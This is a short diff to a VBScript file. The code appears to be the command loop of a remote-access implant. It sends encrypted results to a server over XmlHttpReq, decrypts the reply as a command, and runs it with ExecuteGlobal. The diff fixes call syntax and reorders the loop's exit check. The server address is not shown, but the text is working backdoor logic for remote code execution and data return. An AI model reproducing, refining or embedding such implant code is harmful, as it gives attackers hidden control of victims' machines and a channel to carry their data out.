@@ -53,23 +53,23 @@ Do While True
     If Len(Results) = 0 Then
         XmlHttpReq.Send
     Else
-        XmlHttpReq.Send(Encrypt Results)
+        XmlHttpReq.Send(Encrypt(Results))
         Results = ""
     End If
-    Command = Decrypt XmlHttpReq.responseText
+    Command = Decrypt(XmlHttpReq.responseText)
     Set XmlHttpReq = Nothing
     If Command = "" Then
         BadResponseCount = BadResponseCount + 1
     Else
         BadResponseCount = 0
     End If
-    If BadResponseCount >= BadResponseLimit Or Break Then
-        Exit Do
-    End If
     If ExecVbsRe.Test(Command) Then
         For Each MatchObj in ExecVbsRe.Execute(Command)
             ExecuteGlobal MatchObj.Submatches(0)
         Next
+    End If
+    If BadResponseCount >= BadResponseLimit Or Break Then
+        Exit Do
     End If
     If Len(Results) = 0 Then
         Randomize
